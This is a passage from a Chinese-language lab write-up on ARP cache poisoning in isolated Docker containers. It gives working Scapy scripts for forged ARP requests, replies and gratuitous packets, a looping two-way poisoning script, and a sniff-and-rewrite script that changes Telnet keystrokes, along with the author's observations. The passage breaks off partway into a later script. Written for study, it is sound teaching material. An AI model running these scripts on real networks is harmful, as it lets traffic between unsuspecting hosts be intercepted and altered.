+<p>打开另一个终端，进入容器 A 查看 ARP 缓存</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it A-10.9.0.5 bash
+</span></span><span class="line"><span class="cl">arp -n
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Host A 出现伪造 IP 10.9.0.99，对应攻击者 MAC 地址</p>
+<img src="7.png" style="width: 100%;" />
+<blockquote>
+<p>结论：ARP Request 可直接生成伪造缓存，当 Host A 向该 IP 发起通信时，会把数据发到攻击者的 MAC</p>
+</blockquote>
+<h3 id="task-1barp-reply-投毒">Task 1.B：ARP Reply 投毒
+</h3><blockquote>
+<p>实验目标：验证未经请求的 ARP Reply 报文能否篡改受害者的 ARP 缓存</p>
+<p>方法：构造 ARP Reply，广播伪造数据包，分别针对 Host A 缓存中存在和不存在的 IP 进行测试</p>
+</blockquote>
+<h4 id="缓存中不存在ip">缓存中不存在IP
+</h4><p>在容器M构造 ARP Reply 包（op=2 ），宣告一个 Host A 缓存中不存在的 IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano arp_reply.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改脚本：<code>op=2 </code>，<code>psrc=&quot;10.9.0.98&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arp</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.98&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_reply.py
+</span></span><span class="line"><span class="cl">./arp_reply.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在容器 A 查看 ARP 缓存，缓存没有新增</p>
+<img src="7.png" style="width: 100%;" />
+<h4 id="缓存中存在ip">缓存中存在IP
+</h4><p>在容器M构造 ARP Reply 包（op=2 ），宣告一个 Host A 缓存中存在的 IP，但修改其 MAC 地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano arp_reply.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改脚本：<code>psrc=&quot;10.9.0.99&quot;</code></p>
+<p>加入一行：<code>hwsrc=&quot;11:11:11:11:11:11&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arp</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.99&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hwsrc</span> <span class="o">=</span> <span class="s2">&#34;11:11:11:11:11:11&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_reply.py
+</span></span><span class="line"><span class="cl">./arp_reply.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在容器 A 查看 ARP 缓存， MAC 被篡改</p>
+<img src="8.png" style="width: 100%;" />
+<blockquote>
+<p>结论：出于安全防御机制，Linux 系统通常不会为未请求过的 IP 创建新的 ARP 缓存条目，但会更新已有条目</p>
+</blockquote>
+<h3 id="task-1carp-无端报文">Task 1.C：<strong>ARP</strong> <strong>无端报文</strong>
+</h3><blockquote>
+<p>实验目标：测试源 IP 和目的 IP 相同的特殊广播 ARP 报文的投毒效果</p>
+<p>方法：在攻击者 M 中发送无端 ARP 广播包，分别针对 Host A 缓存中存在和不存在的 IP 进行测试</p>
+</blockquote>
+<h4 id="缓存中不存在ip-1">缓存中不存在IP
+</h4><p>在容器M构造 ARP Gratuitous 包（psrc=pdst ），宣告一个 Host A 缓存中不存在的 IP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano arp_gratuitous.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改脚本：<code>psrc=&quot;10.9.0.98&quot;</code>,<code>pdst=&quot;10.9.0.98&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arp</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.98&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.98&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hwsrc</span> <span class="o">=</span> <span class="s2">&#34;11:11:11:11:11:11&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_gratuitous.py
+</span></span><span class="line"><span class="cl">./arp_gratuitous.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在容器 A 查看 ARP 缓存，缓存没有新增</p>
+<img src="8.png" style="width: 100%;" />
+<h4 id="缓存中存在ip-1">缓存中存在IP
+</h4><p>在容器M构造 ARP Gratuitous 包（psrc=pdst ），宣告一个 Host A 缓存中存在的 IP，但修改其 MAC 地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano arp_gratuitous.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改脚本：<code>psrc=&quot;10.9.0.99&quot;</code>,<code>pdst=&quot;10.9.0.99&quot;</code>，<code>hwsrc=&quot;aa:bb:cc:dd:ee:ff&quot;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arp</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.99&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.99&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hwsrc</span> <span class="o">=</span> <span class="s2">&#34;aa:bb:cc:dd:ee:ff&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arp</span>
+</span></span><span class="line"><span class="cl"><span class="n">sendp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_gratuitous.py
+</span></span><span class="line"><span class="cl">./arp_gratuitous.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在容器 A 查看 ARP 缓存， MAC 被篡改</p>
+<img src="9.png" style="width: 100%;" />
+<blockquote>
+<p>结论：与 Task 1.B 完全一致。无端 ARP 只能更新受害者缓存中已有的记录，无法凭空捏造新记录。</p>
+</blockquote>
+<h2 id="任务二telnet-中间人攻击">任务二：Telnet 中间人攻击
+</h2><blockquote>
+<p>实验目标：拦截 Host A 与 Host B 之间的 Telnet 流量，并将用户输入的所有字母篡改为 <code>A</code></p>
+</blockquote>
+<h3 id="双向投毒">双向投毒
+</h3><p>攻击者持续发送 ARP 伪造包，使：</p>
+<ul>
+<li>A 认为 B 的 MAC 是攻击者</li>
+<li>B 认为 A 的 MAC 是攻击者</li>
+</ul>
+<p>在容器M构造投毒脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano arp_poisoning_mitm.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">eth</span><span class="o">=</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arpab</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.6&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">arpba</span><span class="o">=</span><span class="n">ARP</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">op</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">psrc</span><span class="o">=</span><span class="s2">&#34;10.9.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;10.9.0.6&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet1</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arpab</span>
+</span></span><span class="line"><span class="cl"><span class="n">packet2</span><span class="o">=</span><span class="n">eth</span><span class="o">/</span><span class="n">arpba</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sendp</span><span class="p">(</span><span class="n">packet1</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">sendp</span><span class="p">(</span><span class="n">packet2</span><span class="p">,</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行脚本，可以看到M在持续广播数据包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod +x arp_poisoning_mitm.py 
+</span></span><span class="line"><span class="cl">./arp_poisoning_mitm.py 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="10.png" style="width: 100%;" />
+<p>容器 A 查看 ARP 缓存，可以发现显示的是容器B的IP地址和攻击者的MAC</p>
+<img src="11.png" style="width: 100%;" />
+<p>容器 B 查看 ARP 缓存，可以发现显示的是容器A的IP地址和攻击者的MAC</p>
+<img src="12.png" style="width: 100%;" />
+<h3 id="ip-转发">IP 转发
+</h3><blockquote>
+<p>投毒完成后，攻击者实际上变成a与b的路由器，因此m开不开启IP转发会对A与B的通信产生影响</p>
+</blockquote>
+<p>原来的终端不动，重新打开一个终端，进入容器M，关闭IP转发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>主机A ping主机B，发现大量丢包</p>
+<img src="13.png" style="width: 100%;" />
+<blockquote>
+<p>数据包被骗到了 M 这里，但 M 关闭了路由转发功能，所以包被 M 直接丢弃了</p>
+</blockquote>
+<p>攻击者开启IP转发</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>主机A ping主机B，发现没有丢包</p>
+<img src="14.png" style="width: 100%;" />
+<p>ping的过程中攻击者打开icmp监听</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcpdump -i eth0 icmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到大量 ICMP 重定向消息</p>
+<img src="15.png" style="width: 100%;" />
+<blockquote>
+<p>M 开启了转发，所以包能到达 B。但 M 发现 A 其实可以直接联系 B（在同一个子网 ），于是 M 遵守 ICMP 协议提醒 A 走错了路。</p>
+</blockquote>
+<h3 id="数据篡改">数据篡改
+</h3><blockquote>
+<p>在攻击者 M 中关闭IP转发，随后通过 Python 篡改脚本来实现篡改信息内容的目的</p>
+</blockquote>
+<p>在容器M构造脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nano mitm_tcp.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<details>
+<summary><i>遇到问题：输入以后什么也不显示</i></summary>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">A_IP</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">B_IP</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># A -&gt; B</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">A_IP</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span> <span class="o">==</span> <span class="mi">23</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newdata</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">newdata</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+</span></span><span class="line"><span class="cl">            <span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># B -&gt; A</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">B_IP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+</span></span><span class="line"><span class="cl">            <span class="k">del</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span>
+</span></span><span class="line"><span class="cl">            <span class="n">send</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s2">&#34;tcp&#34;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">process</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本不显示字符是因为缺少了对攻击者自身发出包的过滤逻辑（src == MY_MAC），导致脚本陷入“抓取-&gt;伪造发送-&gt;再次抓取”的死循环。这引发了极其严重的包冲突和重传风暴，使正常的 Telnet 回显流量无法到达终端。解决方法是获取攻击者网卡 MAC 地址并在处理前加一行 if 判断跳过自身发出的包</p>
+</blockquote>
+<blockquote>
+<details>
+<summary><i>虽然显示成功了，但输入几个字符就会卡死</i></summary>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl">
